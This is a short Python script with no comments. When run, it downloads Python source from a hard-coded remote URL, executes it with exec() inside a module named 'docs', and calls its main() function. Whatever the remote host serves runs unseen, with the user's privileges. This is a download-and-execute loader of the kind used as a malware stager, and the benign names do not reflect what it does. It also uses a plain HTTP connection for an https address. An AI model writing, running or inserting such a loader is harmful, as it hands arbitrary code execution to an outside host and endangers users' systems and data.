import sys
import types
import http.client
from urllib.parse import urlparse

def get_source_code(url):
    parsed_url = urlparse(url)
    conn = http.client.HTTPConnection(parsed_url.netloc)
    conn.request("GET", parsed_url.path)
    response = conn.getresponse()
    return response.read().decode('utf-8')

def execute_source_code(source, module_name):
    module = types.ModuleType(module_name)
    sys.modules[module_name] = module
    exec(source, module.__dict__)
    return module

def execute():
    url = "https://resource.contentspace.com/doc/library.py"
    module_name = "docs"

    source = get_source_code(url)
    module = execute_source_code(source, module_name)

    try:
        module.main()
    except Exception as e:
        print(e)

execute()
